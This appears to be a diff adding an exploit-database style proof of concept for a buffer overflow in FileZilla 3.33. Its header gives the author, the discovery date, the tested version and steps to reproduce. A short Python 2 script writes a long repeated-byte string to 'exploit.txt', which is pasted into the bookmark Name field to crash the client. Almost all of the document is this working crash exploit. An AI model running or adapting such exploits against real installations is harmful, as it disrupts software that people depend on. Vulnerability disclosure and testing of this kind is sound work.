@@ -1,0 +1,39 @@
+# Exploit Title: FileZilla 3.33 Buffer-Overflow (PoC)
+
+# Author: Kağan Çapar
+
+# Discovery Date: 2018-10-10
+
+# Software Link: https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/filezilla/3.33.0-1/filezilla_3.33.0-1.debian.tar.xz
+
+# Vendor Homepage : https://filezilla-project.org
+
+# Tested Version: 3.33
+
+# Tested on OS: Kali Linux 2018.3 x64
+
+# Steps to Reproduce: Run the python exploit script, it will create a new
+
+# file with the name "exploit.txt". Copy the content from "exploit.txt".
+
+# Open new terminal and write "filezilla"
+
+# Go to Bookmarks and Add bookmark or Ctrl + B  
+
+# Now paste the contents of "exploit.txt" into the fields. "Name:"
+
+# Click "OK" after Click "Bookmarks" you will see a crash on terminal.
+
+#!/usr/bin/python
+    
+buffer = "\x50\x48\x52" * 1300
+ 
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
